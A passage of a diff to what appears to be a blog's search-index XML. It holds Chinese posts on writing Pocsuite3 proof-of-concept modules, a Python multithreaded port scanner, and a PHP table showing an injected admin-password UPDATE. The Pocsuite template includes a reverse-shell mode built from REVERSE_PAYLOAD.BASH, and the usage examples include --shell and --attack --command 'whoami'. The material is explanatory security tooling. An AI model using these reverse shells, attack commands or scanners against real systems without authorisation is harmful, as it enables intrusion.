-<td align="left">Unauthorized access</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Pocsuite</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>PHP基础</title>
     <url>/article/PHP%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<p>PHP是嵌入式编程语言，嵌入到HTML中，可以是任何位置。</p>
@@ -4724,7 +4378,7 @@
 <td align="left">删除admin所在行，删除限定符必须唯一</td>
 </tr>
 <tr>
-<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#49;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;">&#49;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#109;</a>](mailto:<a href="mailto:&#49;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#109;">&#49;&#x40;&#113;&#x71;&#46;&#99;&#x6f;&#109;</a>)’ WHERE uname=’admin’; “);</td>
+<td align="left">$res = mysqli_query($GLOBALS[‘db’],”UPDATE tb_users SET upass=’$upass’,email=‘<a href="mailto:&#x31;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#x31;&#x40;&#113;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a>](mailto:<a href="mailto:&#49;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;">&#49;&#64;&#113;&#x71;&#x2e;&#x63;&#111;&#x6d;</a>)’ WHERE uname=’admin’; “);</td>
 <td align="left">修改admin密码邮箱</td>
 </tr>
 <tr>
@@ -4778,6 +4432,352 @@
       </categories>
       <tags>
         <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Pocsuite3使用</title>
+    <url>/article/Pocsuite3%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<h1 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h1><pre class="highlight"><span class="line">漏洞应用名_版本号_漏洞类型名称 </span><br></pre>
+
+<p>（所有字母均为小写,所有的符号改成_）</p>
+<p>例：</p>
+<pre class="highlight"><span class="line">88979_cmseasy_5_5_sql_injection.py</span><br></pre>
+
+<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><pre class="highlight"><span class="line">#导入所写PoC所需要类/文件，尽量不要使用第三方模块。</span><br><span class="line">#迫不得已使用第三方模块有其依赖规则，后面给出。</span><br><span class="line">from pocsuite3.api import Output,POCBase,register_poc,requests</span><br><span class="line"></span><br><span class="line">#PoC实现类，继承POCBase</span><br><span class="line">class DemoPoc(POCBase):</span><br><span class="line">	#PoC信息字段，需要完整填写全部下列信息</span><br><span class="line">	vulID = &#x27;1000&#x27;  					# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span><br><span class="line">    version = &#x27;1&#x27; 						# 默认为1</span><br><span class="line">    author = &#x27;chen&#x27; 					# PoC作者的大名</span><br><span class="line">    vulDate = &#x27;2014-10-16&#x27; 				# 漏洞公开的时间,不知道就写今天</span><br><span class="line">    createDate = &#x27;2014-10-16&#x27;			# 编写PoC的日期</span><br><span class="line">    updateDate = &#x27;2014-10-16&#x27;			# PoC更新的时间,默认和编写时间一样</span><br><span class="line">    references = [&#x27;https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html&#x27;]</span><br><span class="line">    									# 漏洞地址来源,0day不用写</span><br><span class="line">    name = &#x27;Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC&#x27;			# PoC名称</span><br><span class="line">    appPowerLink = &#x27;https://www.drupal.org/&#x27;			# 漏洞厂商主页地址</span><br><span class="line">    appName = &#x27;Drupal&#x27;									# 漏洞应用名称</span><br><span class="line">    appVersion = &#x27;7.x&#x27;									# 漏洞影响版本</span><br><span class="line">    vulType = &#x27;SQL Injection&#x27;							# 漏洞类型,类型参考见 漏洞类型规范表</span><br><span class="line">    desc = &#x27;&#x27;&#x27;</span><br><span class="line">    	漏洞简要描述</span><br><span class="line">    &#x27;&#x27;&#x27; </span><br><span class="line">    samples = []										# 测试样列,就是用 PoC 测试成功的网站</span><br><span class="line">    install_requires = [] 	# PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span><br><span class="line">    #第三方插件需再此处注明</span><br><span class="line">   	# 整个字段的值为list，每个项为一个依赖模块</span><br><span class="line">   	# install_requires =[str_item_,str_item,…] </span><br><span class="line">   	# 如果遇到安装时模块名与调用时的不一致情况，用:分割开</span><br><span class="line">   	# 例如常见的加密算法库pycryptodome,但是调用是以from Crypto.Cipher import AES,此时就需要如下填写</span><br><span class="line">	# install_requires = [&#x27;pycryptodome:Crypto&#x27;]</span><br><span class="line">   	pocDesc = &#x27;&#x27;&#x27; </span><br><span class="line">   		poc的用法描述 </span><br><span class="line">   	&#x27;&#x27;&#x27;</span><br><span class="line">   	</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> 	#编写验证模式</span><br><span class="line">	def _verify(self):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        # 验证代码</span><br><span class="line">        if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">     </span><br><span class="line">    #编写攻击模式</span><br><span class="line">    #若没有攻击模式，直接写return self._verify()即可</span><br><span class="line">    def _attack(self):</span><br><span class="line">    	output = Output(self)</span><br><span class="line">    	result = &#123;&#125;</span><br><span class="line">    	# 攻击代码</span><br><span class="line">    	if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    #编写shell模式</span><br><span class="line">    def _shell(self):</span><br><span class="line">    	cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())</span><br><span class="line">    	# 攻击代码 execute cmd</span><br><span class="line">    </span><br><span class="line">    #自定义输出函数，调用框架输出的实例Output</span><br><span class="line">	def parse_output(self,result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">register_poc(DemoPoc)</span><br></pre>
+
+<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><pre class="highlight"><span class="line"># 使用test.py这个PoC去检测http://test.com这个url</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify </span><br><span class="line"></span><br><span class="line"># shell 反弹模式</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify --shell </span><br><span class="line"></span><br><span class="line"># pocsuite3中自带的ecshop poc中实现了自定义命令`command`,可以从外部参数传递</span><br><span class="line">pocsuite -u http://test.com -r ecshop_rce.py --attack --command &quot;whoami&quot; </span><br><span class="line"></span><br><span class="line">#使用test.py这个PoC去检测url.txt文件里所有的url</span><br><span class="line">pocsuite -f url.txt -r test.py --verify </span><br></pre>
+
+<h1 id="Result结果参数说明"><a href="#Result结果参数说明" class="headerlink" title="Result结果参数说明"></a>Result结果参数说明</h1><pre class="highlight"><span class="line">result：[</span><br><span class="line">    &#123;  name: &#x27;DBInfo&#x27;，        value：&#x27;数据库内容&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value：&#x27;管理员密码&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Salt&#x27;，          value: &#x27;加密盐值&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;用户ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Groupid&#x27;，       value: &#x27;用户组ID&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;ShellInfo&#x27;，     value: &#x27;Webshell信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;Webshell地址&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;Webshell内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;FileInfo&#x27;，      value: &#x27;文件信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Filename&#x27;，      value: &#x27;文件名称&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;文件内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;XSSInfo&#x27;，       value: &#x27;跨站脚本信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Payload&#x27;，       value: &#x27;验证Payload&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;AdminInfo&#x27;，     value: &#x27;管理员信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;管理员ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;管理员密码&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;Database&#x27;，      value：&#x27;数据库信息&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Hostname&#x27;，      value: &#x27;数据库主机名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value：&#x27;数据库用户名&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;数据库密码&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;DBname&#x27;，        value: &#x27;数据库名&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;VerifyInfo&#x27;，    value: &#x27;验证信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Target&#x27;，        value: &#x27;验证host:port&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Postdata&#x27;，      value: &#x27;验证POST数据&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Path&#x27;，          value: &#x27;网站绝对路径&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;SiteAttr&#x27;，      value: &#x27;网站服务器信息&#x27;&#125;,</span><br><span class="line">    &#123;  name: &#x27;Process&#x27;，       value: &#x27;服务器进程&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br></pre>
+
+<h1 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h1><table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">from pocsuite3.api import logger</td>
+<td align="left">日志记录，比如logger.log(info)</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import requests</td>
+<td align="left">请求类，用法同 requests</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import Seebug</td>
+<td align="left">Seebug api 调用</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import ZoomEye</td>
+<td align="left">ZoomEye api 调用</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import CEye</td>
+<td align="left">Ceye api 调用</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import crawl</td>
+<td align="left">简单爬虫功能</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import PHTTPServer</td>
+<td align="left">Http服务功能</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import REVERSE_PAYLOAD</td>
+<td align="left">反向连接shell payload</td>
+</tr>
+<tr>
+<td align="left">from pocsuite3.api import get_results</td>
+<td align="left">获取结果</td>
+</tr>
+</tbody></table>
+<h1 id="漏洞类型规范"><a href="#漏洞类型规范" class="headerlink" title="漏洞类型规范"></a>漏洞类型规范</h1><table>
+<thead>
+<tr>
+<th align="left">英文名称</th>
+<th align="left">中文名称</th>
+<th align="left">缩写</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Cross Site Scripting</td>
+<td align="left">跨站脚本</td>
+<td align="left">xss</td>
+</tr>
+<tr>
+<td align="left">Cross Site Request Forgery</td>
+<td align="left">跨站请求伪造</td>
+<td align="left">csrf</td>
+</tr>
+<tr>
+<td align="left">SQL Injection</td>
+<td align="left">Sql注入</td>
+<td align="left">sql-inj</td>
+</tr>
+<tr>
+<td align="left">LDAP Injection</td>
+<td align="left">ldap注入</td>
+<td align="left">ldap-inj</td>
+</tr>
+<tr>
+<td align="left">Mail Command Injection</td>
+<td align="left">邮件命令注入</td>
+<td align="left">smtp-inj</td>
+</tr>
+<tr>
+<td align="left">Null Byte Injection</td>
+<td align="left">空字节注入</td>
+<td align="left">null-byte-inj</td>
+</tr>
+<tr>
+<td align="left">CRLF Injection</td>
+<td align="left">CRLF注入</td>
+<td align="left">crlf-inj</td>
+</tr>
+<tr>
+<td align="left">SSI Injection</td>
+<td align="left">Ssi注入</td>
+<td align="left">ssi-inj</td>
+</tr>
+<tr>
+<td align="left">XPath Injection</td>
+<td align="left">Xpath注入</td>
+<td align="left">xpath-inj</td>
+</tr>
+<tr>
+<td align="left">XML Injection</td>
+<td align="left">Xml注入</td>
+<td align="left">xml-inj</td>
+</tr>
+<tr>
+<td align="left">XQuery Injection</td>
+<td align="left">Xquery 注入</td>
+<td align="left">xquery-inj</td>
+</tr>
+<tr>
+<td align="left">Command Execution</td>
+<td align="left">命令执行</td>
+<td align="left">cmd-exec</td>
+</tr>
+<tr>
+<td align="left">Code Execution</td>
+<td align="left">代码执行</td>
+<td align="left">code-exec</td>
+</tr>
+<tr>
+<td align="left">Remote File Inclusion</td>
+<td align="left">远程文件包含</td>
+<td align="left">rfi</td>
+</tr>
+<tr>
+<td align="left">Local File Inclusion</td>
+<td align="left">本地文件包含</td>
+<td align="left">lfi</td>
+</tr>
+<tr>
+<td align="left">Abuse of Functionality</td>
+<td align="left">功能函数滥用</td>
+<td align="left">func-abuse</td>
+</tr>
+<tr>
+<td align="left">Brute Force</td>
+<td align="left">暴力破解</td>
+<td align="left">brute-force</td>
+</tr>
+<tr>
+<td align="left">Buffer Overflow</td>
+<td align="left">缓冲区溢出</td>
+<td align="left">buffer-overflow</td>
+</tr>
+<tr>
+<td align="left">Content Spoofing</td>
+<td align="left">内容欺骗</td>
+<td align="left">spoofing</td>
+</tr>
+<tr>
+<td align="left">Credential Prediction</td>
+<td align="left">证书预测</td>
+<td align="left">credential-prediction</td>
+</tr>
+<tr>
+<td align="left">Session Prediction</td>
+<td align="left">会话预测</td>
+<td align="left">session-prediction</td>
+</tr>
+<tr>
+<td align="left">Denial of Service</td>
+<td align="left">拒绝服务</td>
+<td align="left">dos</td>
+</tr>
+<tr>
+<td align="left">Fingerprinting</td>
+<td align="left">指纹识别</td>
+<td align="left">finger</td>
+</tr>
+<tr>
+<td align="left">Format String</td>
+<td align="left">格式化字符串</td>
+<td align="left">format-string</td>
+</tr>
+<tr>
+<td align="left">HTTP Response Smuggling</td>
+<td align="left">http响应伪造</td>
+<td align="left">http-response-smuggling</td>
+</tr>
+<tr>
+<td align="left">HTTP Response Splitting</td>
+<td align="left">http响应拆分</td>
+<td align="left">http-response-splitting</td>
+</tr>
+<tr>
+<td align="left">HTTP Request Splitting</td>
+<td align="left">http请求拆分</td>
+<td align="left">http-request-splitting</td>
+</tr>
+<tr>
+<td align="left">HTTP Request Smuggling</td>
+<td align="left">http请求伪造</td>
+<td align="left">http-request-smuggling</td>
+</tr>
+<tr>
+<td align="left">HTTP Parameter Pollution</td>
+<td align="left">http参数污染</td>
+<td align="left">hpp</td>
+</tr>
+<tr>
+<td align="left">Integer Overflows</td>
+<td align="left">整数溢出</td>
+<td align="left">int-overflow</td>
+</tr>
+<tr>
+<td align="left">Predictable Resource Location</td>
+<td align="left">可预测资源定位</td>
+<td align="left">res-location</td>
+</tr>
+<tr>
+<td align="left">Session Fixation</td>
+<td align="left">会话固定</td>
+<td align="left">session-fixation</td>
+</tr>
+<tr>
+<td align="left">URL Redirector Abuse</td>
+<td align="left">url重定向</td>
+<td align="left">redirect</td>
+</tr>
+<tr>
+<td align="left">Privilege Escalation</td>
+<td align="left">权限提升</td>
+<td align="left">privilege-escalation</td>
+</tr>
+<tr>
+<td align="left">Resolve Error</td>
+<td align="left">解析错误</td>
+<td align="left">resolve-error</td>
+</tr>
+<tr>
+<td align="left">Arbitrary File Creation</td>
+<td align="left">任意文件创建</td>
+<td align="left">file-creation</td>
+</tr>
+<tr>
+<td align="left">Arbitrary File Download</td>
+<td align="left">任意文件下载</td>
+<td align="left">file-download</td>
+</tr>
+<tr>
+<td align="left">Arbitrary File Deletion</td>
+<td align="left">任意文件删除</td>
+<td align="left">file-deletion</td>
+</tr>
+<tr>
+<td align="left">Backup File Found</td>
+<td align="left">备份文件发现</td>
+<td align="left">bak-file-found</td>
+</tr>
+<tr>
+<td align="left">Database Found</td>
+<td align="left">数据库发现</td>
+<td align="left">db-found</td>
+</tr>
+<tr>
+<td align="left">Directory Listing</td>
+<td align="left">目录遍历</td>
+<td align="left">dir-listing</td>
+</tr>
+<tr>
+<td align="left">Directory Traversal</td>
+<td align="left">目录穿越</td>
+<td align="left">dir-traversal</td>
+</tr>
+<tr>
+<td align="left">File Upload</td>
+<td align="left">文件上传</td>
+<td align="left">file-upload</td>
+</tr>
+<tr>
+<td align="left">Login Bypass</td>
+<td align="left">登录绕过</td>
+<td align="left">login-bypass</td>
+</tr>
+<tr>
+<td align="left">Weak Password</td>
+<td align="left">弱密码</td>
+<td align="left">weak-pass</td>
+</tr>
+<tr>
+<td align="left">Remote Password Change</td>
+<td align="left">远程密码修改</td>
+<td align="left">remote-pass-change</td>
+</tr>
+<tr>
+<td align="left">Code Disclosure</td>
+<td align="left">代码泄漏</td>
+<td align="left">code-disclosure</td>
+</tr>
+<tr>
+<td align="left">Path Disclosure</td>
+<td align="left">路径泄漏</td>
+<td align="left">path-disclosure</td>
+</tr>
+<tr>
+<td align="left">Information Disclosure</td>
+<td align="left">信息泄漏</td>
+<td align="left">info-disclosure</td>
+</tr>
+<tr>
+<td align="left">Security Mode Bypass</td>
+<td align="left">安全模式绕过</td>
+<td align="left">sec-bypass</td>
+</tr>
+<tr>
+<td align="left">Malware</td>
+<td align="left">挂马</td>
+<td align="left">mal</td>
+</tr>
+<tr>
+<td align="left">Black Link</td>
+<td align="left">暗链</td>
+<td align="left">black-link</td>
+</tr>
+<tr>
+<td align="left">Backdoor</td>
+<td align="left">后门</td>
+<td align="left">backdoor</td>
+</tr>
+<tr>
+<td align="left">Unauthorized access</td>
+<td align="left">未授权访问</td>
+<td align="left">Unauthorized access</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Pocsuite</tag>
       </tags>
   </entry>
   <entry>
@@ -4844,6 +4844,35 @@
       </tags>
   </entry>
   <entry>
+    <title>Python之端口扫描</title>
+    <url>/article/Python%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
+    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。</p>
+<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h2><p>介绍：网络发包请求模块</p>
+<p>使用</p>
+<pre class="highlight"><span class="line">import socket						# 导包</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 		# 创建socket对象</span><br><span class="line">s.bind = ((host,port))				# 绑定端口</span><br><span class="line">s.close								# 断开连接</span><br><span class="line">s.send(msg.decode(&#x27;utf-8&#x27;))			# 发送数据</span><br><span class="line">s.recv(1024)						# 接受数据</span><br><span class="line">s.settimeout()						# 设置超时时间，单位秒</span><br><span class="line">s.sendall							# 发送完整TCP数据</span><br><span class="line">s.sendto							# 发送udp数据</span><br><span class="line"></span><br><span class="line"># 服务端</span><br><span class="line">s.listen							# 设置最大连接数</span><br><span class="line">csocket,addr = s.accept()			# 建立客户端连接</span><br><span class="line"></span><br><span class="line"># 客户端</span><br><span class="line">s.connect((host,port))				# 连接服务器</span><br></pre>
+
+<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><p>介绍：多线程模块</p>
+<p>使用</p>
+<pre class="highlight"><span class="line">import threading							# 导包</span><br><span class="line">t = threading.Thread(target=要执行的函数)		# 设置要开启线程的函数</span><br><span class="line">t.start()									# 开启线程</span><br><span class="line"># linux可直接Ctrl+c结束脚本，Windows下失效</span><br></pre>
+
+<p>守护进程</p>
+<pre class="highlight"><span class="line">t = threading.Thread(target=要执行的函数, daemon=True)   # 设置守护进程，父进程结束则结束全部进程</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"># 主线程空循环，防止结束，同时用来接收中断信号</span><br><span class="line">while True:</span><br><span class="line">	pass</span><br><span class="line"># 用于Windows下接收Ctrl+c信号，结束脚本程序。</span><br></pre>
+
+<p>线程锁，防止多个线程同时操作一个资源对象</p>
+<pre class="highlight"><span class="line">lock = threading.Lock() 	# 多线程开始之前定义</span><br><span class="line">lock.acquire()				# 获取锁</span><br><span class="line">lock.release()				# 释放锁</span><br></pre>
+
+<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"># 全局变量，队列，用来依次存储端口号</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def portScan(q):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        port = q.get()</span><br><span class="line">        # 设置套接字连接</span><br><span class="line">        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒</span><br><span class="line">        c.settimeout(0.5)</span><br><span class="line">        # connect.ex()会一直尝试连接，连接成功返回0，失败返回错误信息（key值）</span><br><span class="line">        if c.connect_ex((host, port)) == 0:</span><br><span class="line">            print(&quot;%s:%d is open&quot; % (host, port))</span><br><span class="line">            s = host + &quot;:&quot; + str(port)</span><br><span class="line">            # 开启进程锁，多线程写入数据</span><br><span class="line">            lock.acquire()</span><br><span class="line">            with open(&#x27;./ports.txt&#x27;, &#x27;a&#x27;) as fp:</span><br><span class="line">                fp.write(s + &quot;\n&quot;)</span><br><span class="line">                # 释放锁</span><br><span class="line">            lock.release()</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;%s:%d not open&quot; % (host, port))</span><br><span class="line">        # 关闭套接字连接</span><br><span class="line">        c.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 独立执行时的程序入口</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #argv用来接收用户输入，按输入次序分别为argv[0-n],argv[0]表示脚本名</span><br><span class="line">    if len(sys.argv) &lt; 3:</span><br><span class="line">        print(&quot;请以以下格式输入：&quot;)</span><br><span class="line">        print(&quot;python portScan.py ip 线程数&quot;)</span><br><span class="line">    host = sys.argv[1]</span><br><span class="line">    thread_num = int(sys.argv[2])</span><br><span class="line">    # 在进程开始前，定义进程锁，不可在进程中定义锁，否则线程自己使用自己的锁，则失去进程锁的意义</span><br><span class="line">    lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">    for port in range(1, 65536):</span><br><span class="line">        q.put(port)</span><br><span class="line">    for i in range(thread_num):</span><br><span class="line">        # 开启守护进程</span><br><span class="line">        t = threading.Thread(target=portScan, args=[q], daemon=True)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    # 设置主进程死循环，方便接收中断信号</span><br><span class="line">    # 因为设置了守护进程，所以主进程结束，子进程也会立刻结束</span><br><span class="line">    while True:</span><br><span class="line">        pass</span><br></pre>
+
+<h1 id="四、下载"><a href="#四、下载" class="headerlink" title="四、下载"></a>四、下载</h1><p><a href="https://www.zerochen.top/download/Port/PortScan.py">https://www.zerochen.top/download/Port/PortScan.py</a></p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>端口扫描</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python之爆破脚本</title>
     <url>/article/Python%E4%B9%8B%E7%88%86%E7%A0%B4%E8%84%9A%E6%9C%AC/</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>利用爆破功能脚本，熟悉参数、进度条模块的使用。</p>
@@ -4898,35 +4927,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python之端口扫描</title>
-    <url>/article/Python%E4%B9%8B%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
-    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>借用端口扫描脚本，记录socket模块和threading模块知识点，以供日后查询。</p>
-<h1 id="二、模块梳理"><a href="#二、模块梳理" class="headerlink" title="二、模块梳理"></a>二、模块梳理</h1><h2 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h2><p>介绍：网络发包请求模块</p>
-<p>使用</p>
-<pre class="highlight"><span class="line">import socket						# 导包</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 		# 创建socket对象</span><br><span class="line">s.bind = ((host,port))				# 绑定端口</span><br><span class="line">s.close								# 断开连接</span><br><span class="line">s.send(msg.decode(&#x27;utf-8&#x27;))			# 发送数据</span><br><span class="line">s.recv(1024)						# 接受数据</span><br><span class="line">s.settimeout()						# 设置超时时间，单位秒</span><br><span class="line">s.sendall							# 发送完整TCP数据</span><br><span class="line">s.sendto							# 发送udp数据</span><br><span class="line"></span><br><span class="line"># 服务端</span><br><span class="line">s.listen							# 设置最大连接数</span><br><span class="line">csocket,addr = s.accept()			# 建立客户端连接</span><br><span class="line"></span><br><span class="line"># 客户端</span><br><span class="line">s.connect((host,port))				# 连接服务器</span><br></pre>
-
-<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><p>介绍：多线程模块</p>
-<p>使用</p>
-<pre class="highlight"><span class="line">import threading							# 导包</span><br><span class="line">t = threading.Thread(target=要执行的函数)		# 设置要开启线程的函数</span><br><span class="line">t.start()									# 开启线程</span><br><span class="line"># linux可直接Ctrl+c结束脚本，Windows下失效</span><br></pre>
-
-<p>守护进程</p>
-<pre class="highlight"><span class="line">t = threading.Thread(target=要执行的函数, daemon=True)   # 设置守护进程，父进程结束则结束全部进程</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line"># 主线程空循环，防止结束，同时用来接收中断信号</span><br><span class="line">while True:</span><br><span class="line">	pass</span><br><span class="line"># 用于Windows下接收Ctrl+c信号，结束脚本程序。</span><br></pre>
-
-<p>线程锁，防止多个线程同时操作一个资源对象</p>
-<pre class="highlight"><span class="line">lock = threading.Lock() 	# 多线程开始之前定义</span><br><span class="line">lock.acquire()				# 获取锁</span><br><span class="line">lock.release()				# 释放锁</span><br></pre>
-
-<h1 id="三、代码"><a href="#三、代码" class="headerlink" title="三、代码"></a>三、代码</h1><pre class="highlight"><span class="line">#!/usr/bin/python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">    描述：借用端口扫描项目，梳理套接字、多线程（守护进程、线程锁）的简单使用</span><br><span class="line">    author：chen</span><br><span class="line">    date:2021-6-27</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line">import queue</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line"># 全局变量，队列，用来依次存储端口号</span><br><span class="line">q = queue.Queue()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def portScan(q):</span><br><span class="line">    while not q.empty():</span><br><span class="line">        port = q.get()</span><br><span class="line">        # 设置套接字连接</span><br><span class="line">        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        # 设置超时重连时间，单位秒，不设置会导致发包速度极慢，默认15秒</span><br><span class="line">        c.settimeout(0.5)</span><br><span class="line">        # 